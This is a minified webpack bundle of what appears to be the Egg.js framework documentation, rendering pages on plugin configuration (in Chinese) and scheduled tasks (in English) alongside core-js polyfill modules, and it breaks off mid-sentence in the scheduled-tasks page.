r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u63d2\u4ef6\u673a\u5236\u662f\u6211\u4eec\u6846\u67b6\u7684\u4e00\u5927\u7279\u8272\u3002\u5b83\u4e0d\u4f46\u53ef\u4ee5\u4fdd\u8bc1\u6846\u67b6\u6838\u5fc3\u7684\u8db3\u591f\u7cbe\u7b80\u3001\u7a33\u5b9a\u3001\u9ad8\u6548\uff0c\u8fd8\u53ef\u4ee5\u4fc3\u8fdb\u4e1a\u52a1\u903b\u8f91\u7684\u590d\u7528\uff0c\u751f\u6001\u5708\u7684\u5f62\u6210\u3002\u6709\u4eba\u53ef\u80fd\u4f1a\u95ee\u4e86"),r.a.createElement("ul",null,r.a.createElement("li",null,"Koa \u5df2\u7ecf\u6709\u4e86\u4e2d\u95f4\u4ef6\u7684\u673a\u5236\uff0c\u4e3a\u5565\u8fd8\u8981\u63d2\u4ef6\u5462\uff1f"),r.a.createElement("li",null,"\u4e2d\u95f4\u4ef6\u3001\u63d2\u4ef6\u3001\u5e94\u7528\u5b83\u4eec\u4e4b\u95f4\u662f\u4ec0\u4e48\u5173\u7cfb\uff0c\u6709\u4ec0\u4e48\u533a\u522b\uff1f"),r.a.createElement("li",null,"\u6211\u8be5\u600e\u4e48\u4f7f\u7528\u4e00\u4e2a\u63d2\u4ef6\uff1f"),r.a.createElement("li",null,"\u5982\u4f55\u7f16\u5199\u4e00\u4e2a\u63d2\u4ef6\uff1f"),r.a.createElement("li",null,"...")),r.a.createElement("p",null,"\u63a5\u4e0b\u6765\u6211\u4eec\u5c31\u6765\u9010\u4e00\u8ba8\u8bba"),r.a.createElement("h2",{id:"\u4e3a\u4ec0\u4e48\u8981\u63d2\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u4e3a\u4ec0\u4e48\u8981\u63d2\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4e3a\u4ec0\u4e48\u8981\u63d2\u4ef6"),r.a.createElement("p",null,"\u6211\u4eec\u5728\u4f7f\u7528 Koa \u4e2d\u95f4\u4ef6\u8fc7\u7a0b\u4e2d\u53d1\u73b0\u4e86\u4e0b\u9762\u4e00\u4e9b\u95ee\u9898\uff1a"),r.a.createElement("ol",null,r.a.createElement("li",null,"\u4e2d\u95f4\u4ef6\u52a0\u8f7d\u5176\u5b9e\u662f\u6709\u5148\u540e\u987a\u5e8f\u7684\uff0c\u4f46\u662f\u4e2d\u95f4\u4ef6\u81ea\u8eab\u5374\u65e0\u6cd5\u7ba1\u7406\u8fd9\u79cd\u987a\u5e8f\uff0c\u53ea\u80fd\u4ea4\u7ed9\u4f7f\u7528\u8005\u3002\u8fd9\u6837\u5176\u5b9e\u975e\u5e38\u4e0d\u53cb\u597d\uff0c\u4e00\u65e6\u987a\u5e8f\u4e0d\u5bf9\uff0c\u7ed3\u679c\u53ef\u80fd\u6709\u5929\u58e4\u4e4b\u522b\u3002"),r.a.createElement("li",null,"\u4e2d\u95f4\u4ef6\u7684\u5b9a\u4f4d\u662f\u62e6\u622a\u7528\u6237\u8bf7\u6c42\uff0c\u5e76\u5728\u5b83\u524d\u540e\u505a\u4e00\u4e9b\u4e8b\u60c5\uff0c\u4f8b\u5982\uff1a\u9274\u6743\u3001\u5b89\u5168\u68c0\u67e5\u3001\u8bbf\u95ee\u65e5\u5fd7\u7b49\u7b49\u3002\u4f46\u5b9e\u9645\u60c5\u51b5\u662f\uff0c\u6709\u4e9b\u529f\u80fd\u662f\u548c\u8bf7\u6c42\u65e0\u5173\u7684\uff0c\u4f8b\u5982\uff1a\u5b9a\u65f6\u4efb\u52a1\u3001\u6d88\u606f\u8ba2\u9605\u3001\u540e\u53f0\u903b\u8f91\u7b49\u7b49\u3002"),r.a.createElement("li",null,"\u6709\u4e9b\u529f\u80fd\u5305\u542b\u975e\u5e38\u590d\u6742\u7684\u521d\u59cb\u5316\u903b\u8f91\uff0c\u9700\u8981\u5728\u5e94\u7528\u542f\u52a8\u7684\u65f6\u5019\u5b8c\u6210\u3002\u8fd9\u663e\u7136\u4e5f\u4e0d\u9002\u5408\u653e\u5230\u4e2d\u95f4\u4ef6\u4e2d\u53bb\u5b9e\u73b0\u3002")),r.a.createElement("p",null,"\u7efc\u4e0a\u6240\u8ff0\uff0c\u6211\u4eec\u9700\u8981\u4e00\u5957\u66f4\u52a0\u5f3a\u5927\u7684\u673a\u5236\uff0c\u6765\u7ba1\u7406\u3001\u7f16\u6392\u90a3\u4e9b\u76f8\u5bf9\u72ec\u7acb\u7684\u4e1a\u52a1\u903b\u8f91\u3002"),r.a.createElement("h3",{id:"\u4e2d\u95f4\u4ef6\u63d2\u4ef6\u5e94\u7528\u7684\u5173\u7cfb"},r.a.createElement(l["AnchorLink"],{to:"#\u4e2d\u95f4\u4ef6\u63d2\u4ef6\u5e94\u7528\u7684\u5173\u7cfb","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4e2d\u95f4\u4ef6\u3001\u63d2\u4ef6\u3001\u5e94\u7528\u7684\u5173\u7cfb"),r.a.createElement("p",null,"\u4e00\u4e2a\u63d2\u4ef6\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u300e\u8ff7\u4f60\u7684\u5e94\u7528\u300f\uff0c\u548c\u5e94\u7528\uff08app\uff09\u51e0\u4e4e\u4e00\u6837\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5b83\u5305\u542b\u4e86 ",r.a.createElement(l["Link"],{to:"./service"},"Service"),"\u3001",r.a.createElement(l["Link"],{to:"./middleware"},"\u4e2d\u95f4\u4ef6"),"\u3001",r.a.createElement(l["Link"],{to:"./config"},"\u914d\u7f6e"),"\u3001",r.a.createElement(l["Link"],{to:"./extend"},"\u6846\u67b6\u6269\u5c55"),"\u7b49\u7b49\u3002"),r.a.createElement("li",null,"\u5b83\u6ca1\u6709\u72ec\u7acb\u7684 ",r.a.createElement(l["Link"],{to:"./router"},"Router")," \u548c ",r.a.createElement(l["Link"],{to:"./controller"},"Controller"),"\u3002"),r.a.createElement("li",null,"\u5b83\u6ca1\u6709 ",r.a.createElement("code",null,"plugin.js"),"\uff0c\u53ea\u80fd\u58f0\u660e\u8ddf\u5176\u4ed6\u63d2\u4ef6\u7684\u4f9d\u8d56\uff0c\u800c",r.a.createElement("strong",null,"\u4e0d\u80fd\u51b3\u5b9a"),"\u5176\u4ed6\u63d2\u4ef6\u7684\u5f00\u542f\u4e0e\u5426\u3002")),r.a.createElement("p",null,"\u4ed6\u4eec\u7684\u5173\u7cfb\u662f\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5e94\u7528\u53ef\u4ee5\u76f4\u63a5\u5f15\u5165 Koa \u7684\u4e2d\u95f4\u4ef6\u3002"),r.a.createElement("li",null,"\u5f53\u9047\u5230\u4e0a\u4e00\u8282\u63d0\u5230\u7684\u573a\u666f\u65f6\uff0c\u5219\u5e94\u7528\u9700\u5f15\u5165\u63d2\u4ef6\u3002"),r.a.createElement("li",null,"\u63d2\u4ef6\u672c\u8eab\u53ef\u4ee5\u5305\u542b\u4e2d\u95f4\u4ef6\u3002"),r.a.createElement("li",null,"\u591a\u4e2a\u63d2\u4ef6\u53ef\u4ee5\u5305\u88c5\u4e3a\u4e00\u4e2a",r.a.createElement(l["Link"],{to:"../advanced/framework"},"\u4e0a\u5c42\u6846\u67b6"),"\u3002")),r.a.createElement("h2",{id:"\u4f7f\u7528\u63d2\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528\u63d2\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528\u63d2\u4ef6"),r.a.createElement("p",null,"\u63d2\u4ef6\u4e00\u822c\u901a\u8fc7 npm \u6a21\u5757\u7684\u65b9\u5f0f\u8fdb\u884c\u590d\u7528\uff1a"),r.a.createElement(o["a"],{code:"$ npm i egg-mysql --save",lang:"bash"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a\u6211\u4eec\u5efa\u8bae\u901a\u8fc7 ",r.a.createElement("code",null,"^")," \u7684\u65b9\u5f0f\u5f15\u5165\u4f9d\u8d56\uff0c\u5e76\u4e14\u5f3a\u70c8\u4e0d\u5efa\u8bae\u9501\u5b9a\u7248\u672c\u3002")),r.a.createElement(o["a"],{code:'{\n  "dependencies": {\n    "egg-mysql": "^3.0.0"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"\u7136\u540e\u9700\u8981\u5728\u5e94\u7528\u6216\u6846\u67b6\u7684 ",r.a.createElement("code",null,"config/plugin.js")," \u4e2d\u58f0\u660e\uff1a"),r.a.createElement(o["a"],{code:"// config/plugin.js\n// \u4f7f\u7528 mysql \u63d2\u4ef6\nexports.mysql = {\n  enable: true,\n  package: 'egg-mysql',\n};",lang:"js"}),r.a.createElement("p",null,"\u5c31\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u63d2\u4ef6\u63d0\u4f9b\u7684\u529f\u80fd\uff1a"),r.a.createElement(o["a"],{code:"app.mysql.query(sql, values);",lang:"js"}),r.a.createElement("h3",{id:"\u53c2\u6570\u4ecb\u7ecd"},r.a.createElement(l["AnchorLink"],{to:"#\u53c2\u6570\u4ecb\u7ecd","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u53c2\u6570\u4ecb\u7ecd"),r.a.createElement("p",null,r.a.createElement("code",null,"plugin.js")," \u4e2d\u7684\u6bcf\u4e2a\u914d\u7f6e\u9879\u652f\u6301\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"{","Boolean","}"," enable")," - \u662f\u5426\u5f00\u542f\u6b64\u63d2\u4ef6\uff0c\u9ed8\u8ba4\u4e3a true"),r.a.createElement("li",null,r.a.createElement("code",null,"{","String","}"," package")," - ",r.a.createElement("code",null,"npm")," \u6a21\u5757\u540d\u79f0\uff0c\u901a\u8fc7 ",r.a.createElement("code",null,"npm")," \u6a21\u5757\u5f62\u5f0f\u5f15\u5165\u63d2\u4ef6"),r.a.createElement("li",null,r.a.createElement("code",null,"{","String","}"," path")," - \u63d2\u4ef6\u7edd\u5bf9\u8def\u5f84\uff0c\u8ddf package \u914d\u7f6e\u4e92\u65a5"),r.a.createElement("li",null,r.a.createElement("code",null,"{","Array","}"," env")," - \u53ea\u6709\u5728\u6307\u5b9a\u8fd0\u884c\u73af\u5883\u624d\u80fd\u5f00\u542f\uff0c\u4f1a\u8986\u76d6\u63d2\u4ef6\u81ea\u8eab ",r.a.createElement("code",null,"package.json")," \u4e2d\u7684\u914d\u7f6e")),r.a.createElement("h3",{id:"\u5f00\u542f\u548c\u5173\u95ed"},r.a.createElement(l["AnchorLink"],{to:"#\u5f00\u542f\u548c\u5173\u95ed","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5f00\u542f\u548c\u5173\u95ed"),r.a.createElement("p",null,"\u5728\u4e0a\u5c42\u6846\u67b6\u5185\u90e8\u5185\u7f6e\u7684\u63d2\u4ef6\uff0c\u5e94\u7528\u5728\u4f7f\u7528\u65f6\u5c31\u4e0d\u7528\u914d\u7f6e package \u6216\u8005 path\uff0c\u53ea\u9700\u8981\u6307\u5b9a enable \u4e0e\u5426\uff1a"),r.a.createElement(o["a"],{code:"// \u5bf9\u4e8e\u5185\u7f6e\u63d2\u4ef6\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u7b80\u6d01\u65b9\u5f0f\u5f00\u542f\u6216\u5173\u95ed\nexports.onerror = false;",lang:"js"}),r.a.createElement("h3",{id:"\u6839\u636e\u73af\u5883\u914d\u7f6e"},r.a.createElement(l["AnchorLink"],{to:"#\u6839\u636e\u73af\u5883\u914d\u7f6e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6839\u636e\u73af\u5883\u914d\u7f6e"),r.a.createElement("p",null,"\u540c\u65f6\uff0c\u6211\u4eec\u8fd8\u652f\u6301 ",r.a.createElement("code",null,"plugin.","{","env","}",".js")," \u8fd9\u79cd\u6a21\u5f0f\uff0c\u4f1a\u6839\u636e",r.a.createElement(l["Link"],{to:"../basics/env"},"\u8fd0\u884c\u73af\u5883"),"\u52a0\u8f7d\u63d2\u4ef6\u914d\u7f6e\u3002"),r.a.createElement("p",null,"\u6bd4\u5982\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5f00\u53d1\u73af\u5883\u4f7f\u7528\u7684\u63d2\u4ef6 ",r.a.createElement("code",null,"egg-dev"),"\uff0c\u53ea\u5e0c\u671b\u5728\u672c\u5730\u73af\u5883\u52a0\u8f7d\uff0c\u53ef\u4ee5\u5b89\u88c5\u5230 ",r.a.createElement("code",null,"devDependencies"),"\u3002"),r.a.createElement(o["a"],{code:'// npm i egg-dev --save-dev\n// package.json\n{\n  "devDependencies": {\n    "egg-dev": "*"\n  }\n}',lang:"js"}),r.a.createElement("p",null,"\u7136\u540e\u5728 ",r.a.createElement("code",null,"plugin.local.js")," \u4e2d\u58f0\u660e\uff1a"),r.a.createElement(o["a"],{code:"// config/plugin.local.js\nexports.dev = {\n  enable: true,\n  package: 'egg-dev',\n};",lang:"js"}),r.a.createElement("p",null,"\u8fd9\u6837\u5728\u751f\u4ea7\u73af\u5883\u53ef\u4ee5 ",r.a.createElement("code",null,"npm i --production")," \u4e0d\u9700\u8981\u4e0b\u8f7d ",r.a.createElement("code",null,"egg-dev")," \u7684\u5305\u4e86\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f:")),r.a.createElement("ul",null,r.a.createElement("li",null,"\u4e0d\u5b58\u5728 ",r.a.createElement("code",null,"plugin.default.js")),r.a.createElement("li",null,r.a.createElement("strong",null,"\u53ea\u80fd\u5728\u5e94\u7528\u5c42\u4f7f\u7528\uff0c\u5728\u6846\u67b6\u5c42\u8bf7\u52ff\u4f7f\u7528\u3002"))),r.a.createElement("h3",{id:"package-\u548c-path"},r.a.createElement(l["AnchorLink"],{to:"#package-\u548c-path","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"package \u548c path"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"package")," \u662f ",r.a.createElement("code",null,"npm")," \u65b9\u5f0f\u5f15\u5165\uff0c\u4e5f\u662f\u6700\u5e38\u89c1\u7684\u5f15\u5165\u65b9\u5f0f"),r.a.createElement("li",null,r.a.createElement("code",null,"path")," \u662f\u7edd\u5bf9\u8def\u5f84\u5f15\u5165\uff0c\u5982\u5e94\u7528\u5185\u90e8\u62bd\u4e86\u4e00\u4e2a\u63d2\u4ef6\uff0c\u4f46\u8fd8\u6ca1\u8fbe\u5230\u5f00\u6e90\u53d1\u5e03\u72ec\u7acb ",r.a.createElement("code",null,"npm")," \u7684\u9636\u6bb5\uff0c\u6216\u8005\u662f\u5e94\u7528\u81ea\u5df1\u8986\u76d6\u4e86\u6846\u67b6\u7684\u4e00\u4e9b\u63d2\u4ef6"),r.a.createElement("li",null,"\u5173\u4e8e\u8fd9\u4e24\u79cd\u65b9\u5f0f\u7684\u4f7f\u7528\u573a\u666f\uff0c\u53ef\u4ee5\u53c2\u89c1",r.a.createElement(l["Link"],{to:"../intro/progressive"},"\u6e10\u8fdb\u5f0f\u5f00\u53d1"),"\u3002")),r.a.createElement(o["a"],{code:"// config/plugin.js\nconst path = require('path');\nexports.mysql = {\n  enable: true,\n  path: path.join(__dirname, '../lib/plugin/egg-mysql'),\n};",lang:"js"}),r.a.createElement("h2",{id:"\u63d2\u4ef6\u914d\u7f6e"},r.a.createElement(l["AnchorLink"],{to:"#\u63d2\u4ef6\u914d\u7f6e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d2\u4ef6\u914d\u7f6e"),r.a.createElement("p",null,"\u63d2\u4ef6\u4e00\u822c\u4f1a\u5305\u542b\u81ea\u5df1\u7684\u9ed8\u8ba4\u914d\u7f6e\uff0c\u5e94\u7528\u5f00\u53d1\u8005\u53ef\u4ee5\u5728 ",r.a.createElement("code",null,"config.default.js")," \u8986\u76d6\u5bf9\u5e94\u7684\u914d\u7f6e\uff1a"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.mysql = {\n  client: {\n    host: 'mysql.com',\n    port: '3306',\n    user: 'test_user',\n    password: 'test_password',\n    database: 'test',\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u5177\u4f53\u5408\u5e76\u89c4\u5219\u53ef\u4ee5\u53c2\u89c1",r.a.createElement(l["Link"],{to:"./config"},"\u914d\u7f6e"),"\u3002"),r.a.createElement("h2",{id:"\u63d2\u4ef6\u5217\u8868"},r.a.createElement(l["AnchorLink"],{to:"#\u63d2\u4ef6\u5217\u8868","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d2\u4ef6\u5217\u8868"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u6846\u67b6\u9ed8\u8ba4\u5185\u7f6e\u4e86\u4f01\u4e1a\u7ea7\u5e94\u7528",r.a.createElement(l["Link"],{to:"https://eggjs.org/zh-cn/plugins/"},"\u5e38\u7528\u7684\u63d2\u4ef6"),"\uff1a",r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-onerror"},"onerror")," \u7edf\u4e00\u5f02\u5e38\u5904\u7406"),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-session"},"Session")," Session \u5b9e\u73b0"),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-i18n"},"i18n")," \u591a\u8bed\u8a00"),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-watcher"},"watcher")," \u6587\u4ef6\u548c\u6587\u4ef6\u5939\u76d1\u63a7"),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-multipart"},"multipart")," \u6587\u4ef6\u6d41\u5f0f\u4e0a\u4f20"),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-security"},"security")," \u5b89\u5168"),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-development"},"development")," \u5f00\u53d1\u73af\u5883\u914d\u7f6e"),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-logrotator"},"logrotator")," \u65e5\u5fd7\u5207\u5206"),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-schedule"},"schedule")," \u5b9a\u65f6\u4efb\u52a1"),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-static"},"static")," \u9759\u6001\u670d\u52a1\u5668"),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-jsonp"},"jsonp")," jsonp \u652f\u6301"),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view"},"view")," \u6a21\u677f\u5f15\u64ce"))),r.a.createElement("li",null,"\u66f4\u591a\u793e\u533a\u7684\u63d2\u4ef6\u53ef\u4ee5 GitHub \u641c\u7d22 ",r.a.createElement(l["Link"],{to:"https://github.com/topics/egg-plugin"},"egg-plugin"),"\u3002")),r.a.createElement("h2",{id:"\u5982\u4f55\u5f00\u53d1\u4e00\u4e2a\u63d2\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u5982\u4f55\u5f00\u53d1\u4e00\u4e2a\u63d2\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5982\u4f55\u5f00\u53d1\u4e00\u4e2a\u63d2\u4ef6"),r.a.createElement("p",null,"\u53c2\u89c1\u6587\u6863\uff1a",r.a.createElement(l["Link"],{to:"../advanced/plugin"},"\u63d2\u4ef6\u5f00\u53d1"),"\u3002")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},Qeuy:function(e,t,n){"use strict";t.__esModule=!0,t.getParameters=void 0;var a=n("7cRc");t.getParameters=a.getParameters},Qfme:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("o7Ua");a({target:"Set",proto:!0,real:!0,forced:r},{addAll:function(){return l.apply(this,arguments)}})},QiLd:function(e,t,n){var a=n("q7Pv"),r=n("tbdv"),l=n("u3TI"),o=a("unscopables"),i=Array.prototype;void 0==i[o]&&l.f(i,o,{configurable:!0,value:r(null)}),e.exports=function(e){i[o][e]=!0}},QkSN:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/development"},"Local Development")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/unittest"},"Unit Testing")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/deployment"},"Deployment")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/logger"},"Logger")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/httpclient"},"HttpClient")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/cookie-and-session"},"Cookie and Session")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/cluster-and-ipc"},"Multi-Process Model and Inter-Process Communication")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/view"},"View Template Rendering")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/error-handling"},"Exception Handling")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/security"},"Security")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/i18n"},"I18n Internationalization")))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(o,{demos:n})}},Ql9K:function(e,t,n){"use strict";var a=n("0mt+"),r=n("wpLQ").end,l=n("zCNj");a({target:"String",proto:!0,forced:l},{padEnd:function(e){return r(this,e,arguments.length>1?arguments[1]:void 0)}})},QlRj:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("V3tB"),o=n("oyD1"),i=n("XaNN"),c=n("j9ts"),s=n("NBU9");a({target:"Set",proto:!0,real:!0,forced:r},{difference:function(e){var t=o(this),n=new(c(t,l("Set")))(t),a=i(n["delete"]);return s(e,(function(e){a.call(n,e)})),n}})},"R+Ix":function(e,t,n){var a=n("V3tB");e.exports=a("navigator","userAgent")||""},R29r:function(e,t,n){"use strict";var a=n("ra1n"),r=n("oyD1"),l=n("N0Us"),o=n("tS9j"),i=n("rSPa"),c=n("JAZO");a("match",1,(function(e,t,n){return[function(t){var n=o(this),a=void 0==t?void 0:t[e];return void 0!==a?a.call(t,n):new RegExp(t)[e](String(n))},function(e){var a=n(t,e,this);if(a.done)return a.value;var o=r(e),s=String(this);if(!o.global)return c(o,s);var u=o.unicode;o.lastIndex=0;var d,m=[],p=0;while(null!==(d=c(o,s))){var h=String(d[0]);m[p]=h,""===h&&(o.lastIndex=i(s,l(o.lastIndex),u)),p++}return 0===p?null:m}]}))},R4aB:function(e,t,n){"use strict";e.exports=n("TGtL")},RGX9:function(e,t,n){"use strict";var a=n("0mt+"),r=n("fd2C"),l=n("Yftc"),o=n("4bQT"),i=n("oi/H"),c=n("XExY"),s=n("AzF/"),u=n("q7Pv"),d=n("m4/z"),m=n("GIAz"),p=n("pa1g"),h=p.IteratorPrototype,g=p.BUGGY_SAFARI_ITERATORS,f=u("iterator"),E="keys",b="values",v="entries",y=function(){return this};e.exports=function(e,t,n,u,p,k,w){r(n,t,u);var x,j,S,C=function(e){if(e===p&&O)return O;if(!g&&e in T)return T[e];switch(e){case E:return function(){return new n(this,e)};case b:return function(){return new n(this,e)};case v:return function(){return new n(this,e)}}return function(){return new n(this)}},A=t+" Iterator",L=!1,T=e.prototype,N=T[f]||T["@@iterator"]||p&&T[p],O=!g&&N||C(p),I="Array"==t&&T.entries||N;if(I&&(x=l(I.call(new e)),h!==Object.prototype&&x.next&&(d||l(x)===h||(o?o(x,h):"function"!=typeof x[f]&&c(x,f,y)),i(x,A,!0,!0),d&&(m[A]=y))),p==b&&N&&N.name!==b&&(L=!0,O=function(){return N.call(this)}),d&&!w||T[f]===O||c(T,f,O),m[t]=O,p)if(j={values:C(b),keys:k?O:C(E),entries:C(v)},w)for(S in j)(g||L||!(S in T))&&s(T,S,j[S]);else a({target:t,proto:!0,forced:g||L},j);return j}},RNGE:function(e,t){var n=/\s/;function a(e){var t=e.length;while(t--&&n.test(e.charAt(t)));return t}e.exports=a},RVfi:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"Although the HTTP Server we developed using the framework is a request-response model, there are still many scenarios that need to execute some scheduled tasks, for example:"),r.a.createElement("ol",null,r.a.createElement("li",null,"Regularly report server application status."),r.a.createElement("li",null,"Regularly update the local cache from the remote interface."),r.a.createElement("li",null,"Regularly split files, delete temporary files.")),r.a.createElement("p",null,"The framework provides a mechanism to make the development and maintenance of scheduled tasks more elegant."),r.a.createElement("h2",{id:"develop-scheduled-tasks"},r.a.createElement(l["AnchorLink"],{to:"#develop-scheduled-tasks","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Develop Scheduled Tasks"),r.a.createElement("p",null,"All scheduled tasks should be placed in directory ",r.a.createElement("code",null,"app/schedule"),". Each file is an independent scheduled task that could configure the properties and the detail methods to be executed."),r.a.createElement("p",null,"A simple example, to define a scheduled task to update the remote data to the memory cache, we can create a ",r.a.createElement("code",null,"update_cache.js")," file in the directory 'app/schedule`"),r.a.createElement(o["a"],{code:"const Subscription = require('egg').Subscription;\n\nclass UpdateCache extends Subscription {\n  // using `schedule` property to set the scheduled task execution interval and other configurations\n  static get schedule() {\n    return {\n      interval: '1m', // 1 minute interval\n      type: 'all', // specify all `workers` need to execute\n    };\n  }\n\n  // `subscribe` is the function to be executed when the scheduled task is triggered\n  async subscribe() {\n    const res = await this.ctx.curl('http://www.api.com/cache', {\n      dataType: 'json',\n    });\n    this.ctx.app.cache = res.data;\n  }\n}\n\nmodule.exports = UpdateCache;",lang:"js"}),r.a.createElement("p",null,"Can also be abbreviated as"),r.a.createElement(o["a"],{code:"module.exports = {\n  schedule: {\n    interval: '1m', // 1 minute interval\n    type: 'all', // specify all `workers` need to execute\n  },\n  async task(ctx) {\n    const res = await ctx.curl('http://www.api.com/cache', {\n      dataType: 'json',\n    });\n    ctx.app.cache = res.data;\n  },\n};",lang:"js"}),r.a.createElement("p",null,"This scheduled task will be executed every 1 minute on every worker process, the requested remote data will be mounted back to ",r.a.createElement("code",null,"app.cache"),"."),r.a.createElement("h3",{id:"task"},r.a.createElement(l["AnchorLink"],{to:"#task","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Task"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"task")," or ",r.a.createElement("code",null,"subscribe")," is compatible with ",r.a.createElement("code",null,"generator function")," and ",r.a.createElement("code",null,"async function"),"."),r.a.createElement("li",null,"The parameter of ",r.a.createElement("code",null,"task")," is ",r.a.createElement("code",null,"ctx"),", anonymous Context instance, we could call ",r.a.createElement("code",null,"service")," and others via it.")),r.a.createElement("h3",{id:"schedule-mode"},r.a.createElement(l["AnchorLink"],{to:"#schedule-mode","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Schedule Mode"),r.a.createElement("p",null,"Schedule tasks can specify ",r.a.createElement("code",null,"interval")," or ",r.a.createElement("code",null,"cron")," two different schedule modes."),r.a.createElement("h4",{id:"interval"},r.a.createElement(l["AnchorLink"],{to:"#interval","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"interval")),r.a.createElement("p",null,"Configure the scheduled tasks by ",r.a.createElement("code",null,"schedule.interval"),", scheduled tasks will be executed every specified time interval. ",r.a.createElement("code",null,"interval")," can be configured as"),r.a.createElement("ul",null,r.a.createElement("li",null,"Integer type, the unit is milliseconds, e.g ",r.a.createElement("code",null,"5000"),"."),r.a.createElement("li",null,"String type, will be transformed to milliseconds by ",r.a.createElement(l["Link"],{to:"https://github.com/zeit/ms"},"ms"),", e.g ",r.a.createElement("code",null,"5s"),".")),r.a.createElement(o["a"],{code:"module.exports = {\n  schedule: {\n    // executed every 10 seconds\n    interval: '10s',\n  },\n};",lang:"js"}),r.a.createElement("h4",{id:"cron"},r.a.createElement(l["AnchorLink"],{to:"#cron","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"cron")),r.a.createElement("p",null,"Configure the scheduled tasks by ",r.a.createElement("code",null,"schedule.cron"),", scheduled tasks will be executed at specified timing according to the cron expressions. cron expressions are parsed by 